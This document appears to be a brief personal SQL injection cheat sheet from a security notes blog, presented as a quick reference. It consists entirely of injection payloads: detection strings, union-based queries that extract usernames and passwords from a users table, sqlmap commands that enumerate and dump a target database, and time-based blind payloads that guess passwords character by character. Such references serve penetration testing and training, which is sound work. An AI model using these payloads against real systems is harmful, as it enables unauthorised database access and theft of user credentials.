---
TitleSEO:    "SQL Injection Notes | ZureFX"
TitlePost:   "SQL Injection Notes"
Author:      "ZureFX"
Description: "SQL injection quick reference: error-based, union-based, blind and time-based techniques with sqlmap usage."
Keywords:    "sql injection, sqli, sqlmap, web security, cheatsheet"
URL:         "https://zurefx.github.io/notes/sql-injection-notes.html"
URL_IMAGES:  "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/notes/sql-injection-notes/"
Date:        "2026-03-13"
Tags:        "SQLi, Web, CheatSheet, OWASP"
Section:     "notes"
Subsection:  "Web"
Lang:        "en"
main_img:    "sql-injection-notes"
Permalink:   "/notes/sql-injection-notes.html"
BtnLabel:    "View Notes"
---

## Detection

```
' OR 1=1--
' AND SLEEP(5)--
' UNION SELECT NULL--
```

## Union-Based

```sql
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT username,password,NULL FROM users--
```

## SQLMap

```bash
sqlmap -u "https://target.com/page?id=1" --dbs
sqlmap -u "https://target.com/page?id=1" -D dbname --tables
sqlmap -u "https://target.com/page?id=1" -D dbname -T users --dump
```

## Blind (Time-Based)

```sql
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTR(password,1,1)='a',SLEEP(5),0)--
```
